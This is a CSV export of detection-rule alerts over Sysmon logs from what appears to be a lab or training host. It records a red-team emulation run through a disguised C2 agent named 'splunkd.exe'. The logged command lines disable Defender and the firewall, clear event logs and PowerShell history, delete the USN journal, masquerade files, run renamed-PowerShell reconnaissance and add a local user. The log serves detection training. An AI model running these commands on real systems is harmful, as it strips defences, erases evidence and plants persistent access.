"2025-12-23 14:07:53.336 +01:00","PSScriptPolicyTest Creation By Uncommon Process","med","DESKTOP-G2OBL3D","Sysmon",11,"Evas","","sysmon",172643,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_tdvv13l3.flg.ps1 ¦ Proc: C:\Windows\Temp\debug.exe ¦ PID: 8540 ¦ PGUID: E9F06A57-9429-694A-B502-000000002300","CreationUtcTime: 2025-12-23 13:07:53.328 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:53.328","file_event_win_ps_script_policy_test_creation_by_uncommon_process.yml","0727210f-3e70-0a60-0d85-98c55ecf7daf","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.698 +01:00","PSScriptPolicyTest Creation By Uncommon Process","med","DESKTOP-G2OBL3D","Sysmon",11,"Evas","","sysmon",172645,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_dzrmlech.i50.ps1 ¦ Proc: C:\Windows\Temp\debug.exe ¦ PID: 5320 ¦ PGUID: E9F06A57-9429-694A-B602-000000002300","CreationUtcTime: 2025-12-23 13:07:53.695 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:53.695","file_event_win_ps_script_policy_test_creation_by_uncommon_process.yml","0727210f-3e70-0a60-0d85-98c55ecf7daf","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.976 +01:00","PSScriptPolicyTest Creation By Uncommon Process","med","DESKTOP-G2OBL3D","Sysmon",11,"Evas","","sysmon",172647,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_54zea3c4.omi.ps1 ¦ Proc: C:\Windows\Temp\debug.exe ¦ PID: 5248 ¦ PGUID: E9F06A57-9429-694A-B702-000000002300","CreationUtcTime: 2025-12-23 13:07:53.971 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:53.971","file_event_win_ps_script_policy_test_creation_by_uncommon_process.yml","0727210f-3e70-0a60-0d85-98c55ecf7daf","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.735 +01:00","Suspicious Double Extension Files","high","DESKTOP-G2OBL3D","Sysmon",11,"Evas","T1036.007","sysmon",172665,"Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.docx.exe ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.732 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.734","file_event_win_susp_double_extension.yml","c69c8c8d-4188-72ea-ca61-a2a1a80612b3","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.741 +01:00","Suspicious Double Extension Files","high","DESKTOP-G2OBL3D","Sysmon",11,"Evas","T1036.007","sysmon",172666,"Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.exe ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.740 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.740","file_event_win_susp_double_extension.yml","c69c8c8d-4188-72ea-ca61-a2a1a80612b3","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:10:31.637 +01:00","Hiding Files with Attrib.exe","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1564.001","sysmon",172659,"Cmdline: attrib.exe +h C:\Users\student\AppData\Local\Temp\T1564.001.txt ¦ Proc: C:\Windows\System32\attrib.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C attrib.exe +h %temp%\T1564.001.txt ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6508 ¦ PGUID: E9F06A57-94C7-694A-C202-000000002300 ¦ ParentPID: 3564 ¦ ParentPGUID: E9F06A57-94C7-694A-C102-000000002300 ¦ Description: Attribute Utility ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=2C94221BE86CD3F24B77560B031CCE6D,SHA256=064181108CD8D7F110CC11B84DBF2D7F18FD5F52A2EE989985D88A969F093DBE,IMPHASH=2CB38FE7D8F223D9DA50B7CBA9B95A6D","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: ATTRIB.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:10:31.633","proc_creation_win_attrib_hiding_files.yml","68daf868-e604-ecd4-ef50-f7306fcd1962","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:14:47.816 +01:00","Fsutil Suspicious Invocation","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Impact","T1070 ¦ T1485","sysmon",172699,"Cmdline: fsutil usn deletejournal /D C: ¦ Proc: C:\Windows\System32\fsutil.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C fsutil usn deletejournal /D C: ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2252 ¦ PGUID: E9F06A57-95C7-694A-DA02-000000002300 ¦ ParentPID: 2876 ¦ ParentPGUID: E9F06A57-95C7-694A-D902-000000002300 ¦ Description: fsutil.exe ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=372D87C19688207295102C51F101ECA0,SHA256=B45547A228FAFFB4CE8CB6F362CFCBCCB441359EB87CF43FDFC8A21B3653E081,IMPHASH=BE5507FF6FB7CBBEA73D7F35F4857805","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:14:47.758","proc_creation_win_fsutil_usage.yml","ec29d301-f750-c068-3d33-f576e2162443","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:09:33.582 +01:00","Firewall Disabled via Netsh.EXE","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1562.004 ¦ S0108","sysmon",172652,"Cmdline: netsh advfirewall set currentprofile state off ¦ Proc: C:\Windows\System32\netsh.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C netsh advfirewall set currentprofile state off ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6052 ¦ PGUID: E9F06A57-948D-694A-BB02-000000002300 ¦ ParentPID: 1668 ¦ ParentPGUID: E9F06A57-948D-694A-BA02-000000002300 ¦ Description: Network Command Shell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=12AD15E6AB0F8C8830F1F600381F204A,SHA256=69AE00A67DCE3C75A810408B1424D2901A6E08B37FD16C9DA87D1B5874B13DD6,IMPHASH=251873EE5CC9E54F8BB552E4F6FDBD14","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: netsh.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:09:33.577","proc_creation_win_netsh_fw_disable.yml","87f5ceb7-47fd-4205-c8a5-3e58affe1a30","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:15:40.952 +01:00","New User Created Via Net.EXE","med","DESKTOP-G2OBL3D","Sysmon",1,"Persis","T1136.001","sysmon",172702,"Cmdline: net user $ ATOMIC123! /add /active:yes ¦ Proc: C:\Windows\System32\net.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C net user $ ATOMIC123! /add /active:yes ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1652 ¦ PGUID: E9F06A57-95FC-694A-DD02-000000002300 ¦ ParentPID: 2620 ¦ ParentPGUID: E9F06A57-95FC-694A-DC02-000000002300 ¦ Description: Net Command ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0E6C2EDA203E61C8AB3B5FAF6E3F49A7,SHA256=63A96F43EB673FD465A4238E3A2BBFE5273B858D806A58375BA1520CE097CDF4,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: net.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:15:40.950","proc_creation_win_net_user_add.yml","5ddc8fc1-8205-b824-5743-3b5529f7c802","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:15:40.985 +01:00","New User Created Via Net.EXE","med","DESKTOP-G2OBL3D","Sysmon",1,"Persis","T1136.001","sysmon",172703,"Cmdline: C:\WINDOWS\system32\net1 user $ ATOMIC123! /add /active:yes ¦ Proc: C:\Windows\System32\net1.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: net user $ ATOMIC123! /add /active:yes ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3268 ¦ PGUID: E9F06A57-95FC-694A-DE02-000000002300 ¦ ParentPID: 1652 ¦ ParentPGUID: E9F06A57-95FC-694A-DD02-000000002300 ¦ Description: Net Command ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=12293EDB07AB8B4D92BAF4BEBFD7A9D8,SHA256=15E3429ECCE48FC6AB66371D040F4C40FB961F2CED4C7D40942279B19DEFE8C7,IMPHASH=98A56655C7E54BCE7F55B3F01AB5B07E","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: net1.exe ¦ ParentImage: C:\Windows\System32\net.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:15:40.982","proc_creation_win_net_user_add.yml","5ddc8fc1-8205-b824-5743-3b5529f7c802","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:06:17.380 +01:00","Powershell Defender Disable Scan Feature","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1562.001","sysmon",172633,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -EnableControlledFolderAccess Disabled;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2380 ¦ PGUID: E9F06A57-93C9-694A-AD02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:06:17.370","proc_creation_win_powershell_defender_disable_feature.yml","74c3ff44-bdf8-8874-01bf-231f647d6f12","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:04:39.319 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172629,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C Clear-History;Clear ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6268 ¦ PGUID: E9F06A57-9367-694A-AB02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:04:39.316","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:05:15.346 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172631,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-PSReadlineOption -HistorySaveStyle SaveNothing"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5240 ¦ PGUID: E9F06A57-938B-694A-AC02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:05:15.337","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:06:17.380 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172633,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -EnableControlledFolderAccess Disabled;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2380 ¦ PGUID: E9F06A57-93C9-694A-AD02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:06:17.370","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.437 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172637,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4400 ¦ PGUID: E9F06A57-9428-694A-B302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.428","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.796 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172640,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-process ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8840 ¦ PGUID: E9F06A57-9428-694A-B402-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.792","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.276 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172642,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-localgroup ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8540 ¦ PGUID: E9F06A57-9429-694A-B502-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.275","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.625 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172644,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-localuser ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5320 ¦ PGUID: E9F06A57-9429-694A-B602-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.624","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.905 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172646,"Cmdline: ""C:\Windows\Temp\debug.exe"" Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5248 ¦ PGUID: E9F06A57-9429-694A-B702-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.904","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:08:56.533 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172649,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Clear-Eventlog Security;Clear-Eventlog System;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8508 ¦ PGUID: E9F06A57-9468-694A-B902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:08:56.521","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
